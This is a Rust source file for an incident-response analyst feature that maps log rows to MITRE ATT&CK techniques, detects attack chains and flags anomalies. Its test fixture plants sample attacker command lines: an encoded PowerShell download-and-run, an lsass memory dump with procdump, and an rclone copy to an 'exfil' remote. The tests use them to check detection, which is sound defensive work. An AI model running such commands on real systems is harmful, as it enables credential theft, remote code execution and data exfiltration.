use crate::db::{self, ColumnMeta};
use crate::intel::activity::{self, ActivityScanSummary};
use crate::intel::anomaly::{self, AnomalyScanSummary};
use crate::intel::matcher::{self, IntelScanSummary};
use crate::intel::query as guided_query;
use crate::intel::roles;
use crate::intel::time;
use anyhow::Result;
use rusqlite::Connection;
use serde::Serialize;
use std::collections::HashMap;

const MAX_TOP_VALUES: usize = 3;
const MAX_NARRATED_CHAINS: usize = 3;
const MAX_NARRATED_TECHNIQUES: usize = 5;
const MAX_NARRATED_ANOMALIES: usize = 5;
const MAX_CITED_ROWS: usize = 10;

#[derive(Debug, Clone, Copy, Eq, PartialEq)]
pub enum AnalystIntent {
    Profile,
    Map,
    Chains,
    Report,
    Search,
}

impl AnalystIntent {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Profile => "profile",
            Self::Map => "map",
            Self::Chains => "chains",
            Self::Report => "report",
            Self::Search => "search",
        }
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystStep {
    pub step: String,
    pub status: String,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystLine {
    pub text: String,
    pub rows: Vec<i64>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystSection {
    pub heading: String,
    pub lines: Vec<AnalystLine>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AnalystAnswer {
    pub intent: String,
    pub headline: String,
    pub sections: Vec<AnalystSection>,
    pub steps: Vec<AnalystStep>,
    pub report_requested: bool,
    pub use_guided_search: bool,
    pub scan: Option<IntelScanSummary>,
    pub anomalies: Option<AnomalyScanSummary>,
    pub activity: Option<ActivityScanSummary>,
}

/// Classifies a free-text ask. Everything the analyst can answer itself runs the pipeline;
/// filter-shaped requests fall back to the existing guided search so the examiner keeps the
/// preview/accept audit flow they already know.
pub fn classify_ask(text: &str) -> AnalystIntent {
    let lower = text.to_lowercase();
    let words: Vec<&str> = lower
        .split(|c: char| !(c.is_alphanumeric() || c == '&' || c == '\''))
        .filter(|word| !word.is_empty())
        .collect();
    let has_word = |wanted: &[&str]| words.iter().any(|word| wanted.contains(word));
    let has_phrase = |wanted: &[&str]| wanted.iter().any(|phrase| lower.contains(phrase));

    // Explicit filter verbs stay with the guided search even when other keywords appear:
    // "filter this by the attacks of alice" is a query, not an analysis request.
    if has_word(&["filter", "filters"]) || has_phrase(&["search for", "show me rows", "rows where"])
    {
        return AnalystIntent::Search;
    }
    if has_word(&["report", "reports", "export", "workbook", "xlsx", "writeup"])
        || has_phrase(&["write up", "write a summary document"])
    {
        return AnalystIntent::Report;
    }
    if has_word(&[
        "chain",
        "chains",
        "chained",
        "story",
        "sequence",
        "correlate",
        "correlated",
        "progression",
        "trace",
    ]) {
        return AnalystIntent::Chains;
    }
    if has_phrase(&[
        "what is in",
        "what's in",
        "whats in",
        "tell me about",
        "what happened",
        "what do we have",
        "row by row",
        "line by line",
        "every row",
        "each row",
        "what activity",
        "which activity",
        "activity is there",
        "all activity",
        "all the activity",
    ]) || has_word(&[
        "parse",
        "parsed",
        "parsing",
        "overview",
        "summary",
        "summarize",
        "summarise",
        "profile",
        "describe",
        "analyze",
        "analyse",
        "triage",
    ]) {
        return AnalystIntent::Profile;
    }
    if has_word(&[
        "mitre",
        "att&ck",
        "attack",
        "attacks",
        "technique",
        "techniques",
        "tactic",
        "tactics",
        "dfir",
        "map",
        "mapped",
        "mapping",
        "suspicious",
        "anomalies",
        "anomalous",
        "anomaly",
        "unusual",
        "hunt",
        "malicious",
        "ioc",
        "iocs",
        "indicator",
        "indicators",
    ]) {
        return AnalystIntent::Map;
    }
    AnalystIntent::Search
}

/// The analyst front door: takes a free-text ask, auto-runs whatever pipeline steps the
/// answer needs (data mapping, timestamp normalization when unambiguous, MITRE scan, chain
/// detection, wide-net anomaly scan), and composes a narrative built only from the computed
/// tables — every claim carries the source row numbers, nothing is invented.
pub fn ask(
    conn: &mut Connection,
    columns: &[ColumnMeta],
    ask_text: &str,
    mut on_progress: impl FnMut(&str),
) -> Result<AnalystAnswer> {
    let intent = classify_ask(ask_text);
    if intent == AnalystIntent::Search {
        return Ok(AnalystAnswer {
            intent: intent.as_str().to_string(),
            headline: "This reads like a filter/search request — use the guided search flow."
                .to_string(),
            sections: Vec::new(),
            steps: Vec::new(),
            report_requested: false,
            use_guided_search: true,
            scan: None,
            anomalies: None,
            activity: None,
        });
    }

    let mut steps = Vec::new();

    // Step 1: data mapping. Existing decisions (including rejections) are respected; the
    // detector only fills in what the examiner has not decided yet.
    on_progress("mapping");
    let had_roles = !load_active_roles(conn)?.is_empty();
    match roles::detect_column_roles(conn, columns) {
        Ok(suggestions) => {
            let described: Vec<String> = suggestions
                .iter()
                .filter(|suggestion| suggestion.status != "rejected")
                .map(|suggestion| format!("{}→{}", suggestion.role, suggestion.original_name))
                .collect();
            steps.push(AnalystStep {
                step: "data_mapping".to_string(),
                status: if had_roles { "reused" } else { "ran" }.to_string(),
                detail: if described.is_empty() {
                    "no column roles could be suggested".to_string()
                } else {
                    described.join(", ")
                },
            });
        }
        Err(error) => steps.push(AnalystStep {
            step: "data_mapping".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    // Step 2: timestamp normalization — only when it needs no examiner judgment. Ambiguous
    // timezones/date conventions stay a human decision; the analyst says so instead of
    // guessing (same stance as the timeline feature itself).
    on_progress("timeline");
    match time::analyze_confirmed_timestamp_column(conn, columns) {
        Err(error) => steps.push(AnalystStep {
            step: "timeline".to_string(),
            status: "skipped".to_string(),
            detail: format!("no usable timestamp mapping: {error}"),
        }),
        Ok(analysis) => {
            if analysis.needs_timezone || analysis.needs_date_convention {
                let status = if row_time_available(conn)? {
                    "reused"
                } else {
                    "skipped"
                };
                steps.push(AnalystStep {
                    step: "timeline".to_string(),
                    status: status.to_string(),
                    detail: if status == "reused" {
                        "kept the previously normalized timeline; new normalization needs a timezone/date answer".to_string()
                    } else {
                        "timestamps need an examiner answer (timezone or date convention) before a timeline can be built".to_string()
                    },
                });
            } else if time::row_time_is_bound_to(conn, columns, &analysis.timestamp_column)
                .unwrap_or(false)
            {
                steps.push(AnalystStep {
                    step: "timeline".to_string(),
                    status: "reused".to_string(),
                    detail: format!(
                        "timeline already normalized from '{}'",
                        analysis.original_name
                    ),
                });
            } else {
                match time::normalize_timestamp_column_with_options(conn, columns, None, None) {
                    Ok(summary) => steps.push(AnalystStep {
                        step: "timeline".to_string(),
                        status: "ran".to_string(),
                        detail: format!(
                            "normalized {} rows to UTC from '{}'",
                            summary.rows_written, summary.original_name
                        ),
                    }),
                    Err(error) => steps.push(AnalystStep {
                        step: "timeline".to_string(),
                        status: "failed".to_string(),
                        detail: error.to_string(),
                    }),
                }
            }
        }
    }

    // Step 3: MITRE scan + chain detection over the active evidence mappings.
    on_progress("mitre-scan");
    let mut scan_summary = None;
    let evidence_columns = guided_query::active_evidence_columns(conn)?;
    if evidence_columns.is_empty() {
        steps.push(AnalystStep {
            step: "mitre_scan".to_string(),
            status: "skipped".to_string(),
            detail: "no evidence columns are mapped (command line/process/file/host/text)"
                .to_string(),
        });
    } else {
        match matcher::scan_connection(conn, &evidence_columns, |_, _, _| {}) {
            Ok(summary) => {
                steps.push(AnalystStep {
                    step: "mitre_scan".to_string(),
                    status: "ran".to_string(),
                    detail: format!(
                        "{} matches on {} rows, {} chains",
                        summary.match_count,
                        summary.matched_rows,
                        summary.chains.len()
                    ),
                });
                scan_summary = Some(summary);
            }
            Err(error) => steps.push(AnalystStep {
                step: "mitre_scan".to_string(),
                status: "failed".to_string(),
                detail: error.to_string(),
            }),
        }
    }

    // Step 4: wide-net anomaly scan — independent of the curated library, tolerant of
    // false positives by design.
    on_progress("anomaly-scan");
    let mut anomaly_summary = None;
    match anomaly::scan_anomalies(conn, columns, |_, _, _| {}) {
        Ok(summary) => {
            steps.push(AnalystStep {
                step: "anomaly_scan".to_string(),
                status: "ran".to_string(),
                detail: format!(
                    "{} heuristic findings on {} rows",
                    summary.finding_count, summary.flagged_rows
                ),
            });
            anomaly_summary = Some(summary);
        }
        Err(error) => steps.push(AnalystStep {
            step: "anomaly_scan".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    // Step 5: per-row activity classification — every row gets a label, so "what activity is
    // there row by row" can be answered about the whole file, not just the suspicious slice.
    on_progress("activity");
    let mut activity_summary = None;
    match activity::classify_rows(conn, columns, |_, _, _| {}) {
        Ok(summary) => {
            steps.push(AnalystStep {
                step: "activity".to_string(),
                status: "ran".to_string(),
                detail: format!(
                    "classified all {} rows into {} activity types",
                    summary.rows_classified,
                    summary.categories.len()
                ),
            });
            activity_summary = Some(summary);
        }
        Err(error) => steps.push(AnalystStep {
            step: "activity".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    // Step 6: how many rows active ignore rules excluded from steps 3-5 above. Dataset-wide,
    // not specific to any one stage, so it's stated once here rather than repeated in each of
    // their details — by this point every stage above has run, so `_ignored_rows` is populated.
    on_progress("ignore-rules");
    match crate::intel::ignore_rules::ignored_rows_summary(conn) {
        Ok((rows_ignored, by_rule)) if rows_ignored > 0 => {
            let breakdown = by_rule
                .iter()
                .map(|rule| format!("{} ({})", rule.rule_name, rule.row_count))
                .collect::<Vec<_>>()
                .join(", ");
            steps.push(AnalystStep {
                step: "ignore_rules".to_string(),
                status: "ran".to_string(),
                detail: format!(
                    "{rows_ignored} row(s) excluded from analysis by active ignore rules: {breakdown}"
                ),
            });
        }
        Ok(_) => steps.push(AnalystStep {
            step: "ignore_rules".to_string(),
            status: "ran".to_string(),
            detail: "no rows excluded by ignore rules".to_string(),
        }),
        Err(error) => steps.push(AnalystStep {
            step: "ignore_rules".to_string(),
            status: "failed".to_string(),
            detail: error.to_string(),
        }),
    }

    on_progress("compose");
    let sections = compose_sections(
        conn,
        columns,
        scan_summary.as_ref(),
        anomaly_summary.as_ref(),
        activity_summary.as_ref(),
    )?;
    let headline = compose_headline(scan_summary.as_ref(), anomaly_summary.as_ref());

    Ok(AnalystAnswer {
        intent: intent.as_str().to_string(),
        headline,
        sections,
        steps,
        report_requested: intent == AnalystIntent::Report,
        use_guided_search: false,
        scan: scan_summary,
        anomalies: anomaly_summary,
        activity: activity_summary,
    })
}

fn compose_headline(
    scan: Option<&IntelScanSummary>,
    anomalies: Option<&AnomalyScanSummary>,
) -> String {
    if let Some(scan) = scan {
        if let Some(chain) = scan.chains.first() {
            let host = chain
                .host
                .as_deref()
                .map(|host| format!(" on host {host}"))
                .unwrap_or_default();
            return format!(
                "Chained attack activity{host}: {} tactics ({}) across {} rows.",
                chain.tactic_count,
                chain.tactic_names.join(" → "),
                chain.row_count
            );
        }
        if scan.match_count > 0 {
            let top_tactic = scan
                .tactics
                .first()
                .map(|tactic| format!(" — most active tactic: {}", tactic.name))
                .unwrap_or_default();
            return format!(
                "{} MITRE-mapped findings on {} rows, no multi-tactic chain within one time window{top_tactic}.",
                scan.match_count, scan.matched_rows
            );
        }
    }
    if let Some(anomalies) = anomalies {
        if anomalies.flagged_rows > 0 {
            return format!(
                "No curated MITRE matches; the wide-net heuristic layer flagged {} rows worth reviewing.",
                anomalies.flagged_rows
            );
        }
    }
    "Nothing notable found: no MITRE-mapped matches, no attack chains, and no heuristic anomalies."
        .to_string()
}

fn compose_sections(
    conn: &Connection,
    columns: &[ColumnMeta],
    scan: Option<&IntelScanSummary>,
    anomalies: Option<&AnomalyScanSummary>,
    activity: Option<&ActivityScanSummary>,
) -> Result<Vec<AnalystSection>> {
    let mut sections = Vec::new();
    sections.push(dataset_section(conn, columns)?);

    if let Some(activity) = activity {
        let mut lines = Vec::new();
        lines.push(AnalystLine {
            text: format!(
                "All {} rows classified into {} activity types.",
                activity.rows_classified,
                activity.categories.len()
            ),
            rows: Vec::new(),
        });
        for category in &activity.categories {
            let share = if activity.rows_classified > 0 {
                (category.row_count as f64 / activity.rows_classified as f64) * 100.0
            } else {
                0.0
            };
            let top = if category.top_details.is_empty() {
                String::new()
            } else {
                let described: Vec<String> = category
                    .top_details
                    .iter()
                    .map(|detail| format!("'{}' ({} rows)", detail.detail, detail.row_count))
                    .collect();
                format!(" Most common: {}.", described.join(", "))
            };
            lines.push(AnalystLine {
                text: format!(
                    "{}: {} rows ({share:.1}%).{top}",
                    category.label, category.row_count
                ),
                rows: Vec::new(),
            });
        }
        sections.push(AnalystSection {
            heading: "Activity, row by row".to_string(),
            lines,
        });
    }

    if let Some(scan) = scan {
        let mut lines = Vec::new();
        if scan.match_count == 0 {
            lines.push(AnalystLine {
                text: "No curated-library matches. The library is curated rather than exhaustive — check the anomaly section for wide-net signals.".to_string(),
                rows: Vec::new(),
            });
        } else {
            lines.push(AnalystLine {
                text: format!(
                    "{} matches on {} rows across {} tactics.",
                    scan.match_count,
                    scan.matched_rows,
                    scan.tactics.len()
                ),
                rows: Vec::new(),
            });
            for technique in scan.techniques.iter().take(MAX_NARRATED_TECHNIQUES) {
                let rows = technique_sample_rows(conn, &technique.id)?;
                lines.push(AnalystLine {
                    text: format!(
                        "{} ({}): {} rows.",
                        technique.name, technique.id, technique.row_count
                    ),
                    rows,
                });
            }
        }
        sections.push(AnalystSection {
            heading: "MITRE ATT&CK mapping".to_string(),
            lines,
        });

        let mut chain_lines = Vec::new();
        for chain in scan.chains.iter().take(MAX_NARRATED_CHAINS) {
            let host = chain
                .host
                .as_deref()
                .map(|host| format!("on host {host}"))
                .unwrap_or_else(|| "with no host mapping".to_string());
            let window = match (chain.start_epoch_ms, chain.end_epoch_ms) {
                (Some(start), Some(end)) => {
                    format!(" between {} and {}", format_utc(start), format_utc(end))
                }
                _ => String::new(),
            };
            chain_lines.push(AnalystLine {
                text: format!(
                    "Chain {} {host}{window}: {} → progression over {} rows (score {}). Techniques: {}.",
                    chain.chain_id,
                    chain.tactic_names.join(" → "),
                    chain.row_count,
                    chain.score,
                    chain.technique_names.join(", ")
                ),
                rows: chain.sample_rows.iter().copied().take(MAX_CITED_ROWS).collect(),
            });
        }
        if chain_lines.is_empty() {
            chain_lines.push(AnalystLine {
                text: "No multi-tactic chain: matched activity does not progress across ≥3 tactics on one host within an hour.".to_string(),
                rows: Vec::new(),
            });
        }
        sections.push(AnalystSection {
            heading: "Attack chains".to_string(),
            lines: chain_lines,
        });
    }

    if let Some(anomalies) = anomalies {
        let mut lines = Vec::new();
        if anomalies.flagged_rows == 0 {
            lines.push(AnalystLine {
                text: "The wide-net heuristic layer found nothing beyond the curated library."
                    .to_string(),
                rows: Vec::new(),
            });
        } else {
            lines.push(AnalystLine {
                text: format!(
                    "Wide-net heuristics (false positives expected by design) flagged {} findings on {} rows.",
                    anomalies.finding_count, anomalies.flagged_rows
                ),
                rows: Vec::new(),
            });
            let categories: Vec<String> = anomalies
                .categories
                .iter()
                .map(|category| format!("{} ({} rows)", category.label, category.row_count))
                .collect();
            if !categories.is_empty() {
                lines.push(AnalystLine {
                    text: format!("Categories: {}.", categories.join(", ")),
                    rows: Vec::new(),
                });
            }
            for row in anomalies.top_rows.iter().take(MAX_NARRATED_ANOMALIES) {
                lines.push(AnalystLine {
                    text: format!("Row {}: {}.", row.row_num, row.top_reason),
                    rows: vec![row.row_num],
                });
            }
        }
        sections.push(AnalystSection {
            heading: "Anomalies (heuristic)".to_string(),
            lines,
        });
    }

    Ok(sections)
}

fn dataset_section(conn: &Connection, columns: &[ColumnMeta]) -> Result<AnalystSection> {
    let mut lines = Vec::new();
    if let Ok(info) = db::load_import_info(conn) {
        let file_name = std::path::Path::new(&info.source_path)
            .file_name()
            .map(|name| name.to_string_lossy().to_string())
            .unwrap_or_else(|| info.source_path.clone());
        lines.push(AnalystLine {
            text: format!(
                "{} rows, {} columns from '{}' (sheet '{}').",
                info.row_count,
                columns.len(),
                file_name,
                info.sheet_name
            ),
            rows: Vec::new(),
        });
    }

    let roles = load_active_roles(conn)?;
    if !roles.is_empty() {
        let described: Vec<String> = roles
            .iter()
            .map(|(role, sql_name)| {
                let original = columns
                    .iter()
                    .find(|column| &column.sql_name == sql_name)
                    .map(|column| column.original_name.as_str())
                    .unwrap_or(sql_name.as_str());
                format!("{role}: {original}")
            })
            .collect();
        lines.push(AnalystLine {
            text: format!("Column mapping — {}.", described.join(", ")),
            rows: Vec::new(),
        });
    }

    if let Some((start, end)) = time_range(conn)? {
        lines.push(AnalystLine {
            text: format!(
                "Events span {} to {} (UTC).",
                format_utc(start),
                format_utc(end)
            ),
            rows: Vec::new(),
        });
    }

    let role_map: HashMap<String, String> = roles.into_iter().collect();
    for (role, label) in [("user", "Users"), ("host", "Hosts")] {
        if let Some(sql_name) = role_map.get(role) {
            let top = top_values(conn, sql_name)?;
            if !top.is_empty() {
                let described: Vec<String> = top
                    .iter()
                    .map(|(value, count)| format!("{value} ({count} rows)"))
                    .collect();
                lines.push(AnalystLine {
                    text: format!("{label}: {}.", described.join(", ")),
                    rows: Vec::new(),
                });
            }
        }
    }

    Ok(AnalystSection {
        heading: "Dataset".to_string(),
        lines,
    })
}

fn load_active_roles(conn: &Connection) -> Result<Vec<(String, String)>> {
    if !table_exists(conn, "_column_roles")? {
        return Ok(Vec::new());
    }
    let mut stmt = conn.prepare(
        "SELECT role, sql_name FROM _column_roles
         WHERE status IN ('suggested', 'confirmed')
         ORDER BY role",
    )?;
    let rows = stmt
        .query_map([], |row| Ok((row.get(0)?, row.get(1)?)))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(rows)
}

fn row_time_available(conn: &Connection) -> Result<bool> {
    if !table_exists(conn, "_row_time")? {
        return Ok(false);
    }
    let count: i64 = conn.query_row("SELECT COUNT(*) FROM _row_time", [], |row| row.get(0))?;
    Ok(count > 0)
}

fn time_range(conn: &Connection) -> Result<Option<(i64, i64)>> {
    if !row_time_available(conn)? {
        return Ok(None);
    }
    let range: (Option<i64>, Option<i64>) = conn.query_row(
        "SELECT MIN(epoch_ms), MAX(epoch_ms) FROM _row_time",
        [],
        |row| Ok((row.get(0)?, row.get(1)?)),
    )?;
    Ok(match range {
        (Some(start), Some(end)) => Some((start, end)),
        _ => None,
    })
}

fn top_values(conn: &Connection, sql_name: &str) -> Result<Vec<(String, i64)>> {
    let ident = db::quote_ident(sql_name);
    let mut stmt = conn.prepare(&format!(
        "SELECT {ident}, COUNT(*) FROM rows
         WHERE {ident} IS NOT NULL AND TRIM({ident}) != ''
         GROUP BY {ident}
         ORDER BY COUNT(*) DESC
         LIMIT {MAX_TOP_VALUES}"
    ))?;
    let rows = stmt
        .query_map([], |row| Ok((row.get::<_, String>(0)?, row.get(1)?)))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(rows)
}

fn technique_sample_rows(conn: &Connection, technique_id: &str) -> Result<Vec<i64>> {
    let mut stmt = conn.prepare(
        "SELECT DISTINCT row_num FROM _intel_match
         WHERE technique_id = ?1
         ORDER BY score DESC, row_num ASC
         LIMIT 3",
    )?;
    let rows = stmt
        .query_map([technique_id], |row| row.get(0))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(rows)
}

fn format_utc(epoch_ms: i64) -> String {
    chrono::DateTime::from_timestamp_millis(epoch_ms)
        .map(|dt| dt.format("%Y-%m-%d %H:%M:%S UTC").to_string())
        .unwrap_or_else(|| format!("epoch {epoch_ms}ms"))
}

fn table_exists(conn: &Connection, name: &str) -> Result<bool> {
    let exists: i64 = conn.query_row(
        "SELECT EXISTS(SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = ?1)",
        [name],
        |row| row.get(0),
    )?;
    Ok(exists != 0)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::ImportInfo;

    #[test]
    fn classification_covers_the_users_example_asks() {
        assert_eq!(classify_ask("what is in this xls"), AnalystIntent::Profile);
        assert_eq!(classify_ask("map this on mitre"), AnalystIntent::Map);
        assert_eq!(classify_ask("find chained activity"), AnalystIntent::Chains);
        assert_eq!(
            classify_ask("make chronological attack report"),
            AnalystIntent::Report
        );
        assert_eq!(
            classify_ask("find anything suspicious in a dfir manner"),
            AnalystIntent::Map
        );
        assert_eq!(classify_ask("what happened here?"), AnalystIntent::Profile);
        assert_eq!(
            classify_ask("parse this xls and find me row by row what activity is there"),
            AnalystIntent::Profile
        );
        assert_eq!(
            classify_ask("filter me this xls by the attacks of this user"),
            AnalystIntent::Search
        );
        assert_eq!(
            classify_ask("mimikatz alice"),
            AnalystIntent::Search
        );
    }

    fn fixture() -> (Connection, Vec<ColumnMeta>) {
        let conn = Connection::open_in_memory().unwrap();
        let columns = vec![
            ColumnMeta {
                sql_name: "timegenerated".into(),
                original_name: "TimeGenerated".into(),
                col_index: 0,
                inferred_type: "timestamp".into(),
            },
            ColumnMeta {
                sql_name: "account".into(),
                original_name: "Account".into(),
                col_index: 1,
                inferred_type: "text".into(),
            },
            ColumnMeta {
                sql_name: "computer".into(),
                original_name: "Computer".into(),
                col_index: 2,
                inferred_type: "text".into(),
            },
            ColumnMeta {
                sql_name: "commandline".into(),
                original_name: "CommandLine".into(),
                col_index: 3,
                inferred_type: "text".into(),
            },
        ];
        db::create_schema(&conn, &columns).unwrap();
        db::record_import_info(
            &conn,
            &ImportInfo {
                source_path: "C:\\cases\\incident.xlsx".to_string(),
                sheet_name: "Sentinel".to_string(),
                row_count: 6,
                imported_at: "2026-07-19T00:00:00Z".to_string(),
            },
        )
        .unwrap();
        let rows = [
            (1, "2026-01-05T09:00:00Z", "CORP\\eve", "WS-07", "powershell.exe -nop -w hidden -enc SQBFAFgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA3AC8AYQAnACkA"),
            (2, "2026-01-05T09:05:00Z", "CORP\\eve", "WS-07", "whoami /all"),
            (3, "2026-01-05T09:12:00Z", "CORP\\eve", "WS-07", "procdump.exe -ma lsass.exe C:\\Users\\Public\\l.dmp"),
            (4, "2026-01-05T09:30:00Z", "CORP\\eve", "WS-07", "rclone copy C:\\Users\\Public\\staging remote:exfil"),
            (5, "2026-01-05T10:00:00Z", "CORP\\dave", "WS-02", "notepad.exe C:\\notes\\todo.txt"),
            (6, "2026-01-05T10:05:00Z", "CORP\\dave", "WS-02", "ping 127.0.0.1"),
        ];
        for (row_num, ts, account, computer, cmd) in rows {
            conn.execute(
                "INSERT INTO rows (row_num, timegenerated, account, computer, commandline)
                 VALUES (?1, ?2, ?3, ?4, ?5)",
                rusqlite::params![row_num, ts, account, computer, cmd],
            )
            .unwrap();
        }
        (conn, columns)
    }

    #[test]
    fn profile_ask_runs_the_whole_pipeline_and_names_the_actor() {
        let (mut conn, columns) = fixture();
        let mut phases = Vec::new();
        let answer = ask(&mut conn, &columns, "what is in this file?", |phase| {
            phases.push(phase.to_string())
        })
        .unwrap();

        assert_eq!(answer.intent, "profile");
        assert!(!answer.report_requested);
        assert!(!answer.use_guided_search);
        assert!(phases.contains(&"mitre-scan".to_string()));

        let step_status: HashMap<&str, &str> = answer
            .steps
            .iter()
            .map(|step| (step.step.as_str(), step.status.as_str()))
            .collect();
        assert_eq!(step_status.get("data_mapping"), Some(&"ran"));
        assert_eq!(step_status.get("timeline"), Some(&"ran"));
        assert_eq!(step_status.get("mitre_scan"), Some(&"ran"));
        assert_eq!(step_status.get("anomaly_scan"), Some(&"ran"));
        assert_eq!(step_status.get("activity"), Some(&"ran"));

        let activity = answer.activity.as_ref().expect("activity summary");
        assert_eq!(activity.rows_classified, 6);
        assert!(answer
            .sections
            .iter()
            .any(|section| section.heading == "Activity, row by row"));

        let scan = answer.scan.as_ref().expect("scan summary");
        assert!(scan.match_count > 0, "curated scan should hit planted rows");
        assert!(
            !scan.chains.is_empty(),
            "multi-tactic activity on WS-07 within one hour should chain"
        );
        assert_eq!(scan.chains[0].host.as_deref(), Some("WS-07"));

        let anomalies = answer.anomalies.as_ref().expect("anomaly summary");
        assert!(anomalies.flagged_rows > 0);

        assert!(answer.headline.contains("WS-07"), "{}", answer.headline);
        let all_text: String = answer
            .sections
            .iter()
            .flat_map(|section| section.lines.iter())
            .map(|line| line.text.clone())
            .collect::<Vec<_>>()
            .join(" ");
        assert!(all_text.contains("CORP\\eve"), "{all_text}");
        assert!(all_text.contains("incident.xlsx"), "{all_text}");
        // Grounding: cited rows must exist in the data.
        for section in &answer.sections {
            for line in &section.lines {
                for row in &line.rows {
                    assert!((1..=6).contains(row), "cited row {row} outside dataset");
                }
            }
        }
    }

    #[test]
    fn profile_ask_reports_an_ignore_rules_step() {
        let mut conn = Connection::open_in_memory().unwrap();
        let columns = vec![db::ColumnMeta {
            sql_name: "processname".into(),
            original_name: "ProcessName".into(),
            col_index: 0,
            inferred_type: "text".into(),
        }];
        db::create_schema(&conn, &columns).unwrap();
        db::create_column_roles_table(&conn).unwrap();
        conn.execute(
            "INSERT INTO _column_roles (role, sql_name, confidence, status, reasons_json)
             VALUES ('process_name', 'processname', 1.0, 'confirmed', '[]')",
            [],
        )
        .unwrap();
        conn.execute(
            "INSERT INTO rows (row_num, processname) VALUES
             (1, 'QualysAgent.exe'), (2, 'winlogon.exe'), (3, 'explorer.exe')",
            [],
        )
        .unwrap();

        let answer = ask(&mut conn, &columns, "what is in this file?", |_| {}).unwrap();
        let ignore_step = answer
            .steps
            .iter()
            .find(|step| step.step == "ignore_rules")
            .expect("ignore_rules step must always be present");
        assert_eq!(ignore_step.status, "ran");
        assert!(
            ignore_step.detail.contains("1 row(s)")
                && ignore_step.detail.contains("Qualys Cloud Agent process activity"),
            "{}",
            ignore_step.detail
        );
        assert_eq!(answer.activity.as_ref().unwrap().rows_ignored, 1);
        assert_eq!(answer.anomalies.as_ref().unwrap().rows_ignored, 1);
    }

    #[test]
    fn report_ask_flags_report_generation() {
        let (mut conn, columns) = fixture();
        let answer = ask(&mut conn, &columns, "make me an attack report", |_| {}).unwrap();
        assert_eq!(answer.intent, "report");
        assert!(answer.report_requested);
    }

    #[test]
    fn search_ask_falls_back_without_running_the_pipeline() {
        let (mut conn, columns) = fixture();
        let answer = ask(&mut conn, &columns, "filter rows for alice", |_| {}).unwrap();
        assert_eq!(answer.intent, "search");
        assert!(answer.use_guided_search);
        assert!(answer.steps.is_empty());
        assert!(answer.scan.is_none());
    }
}
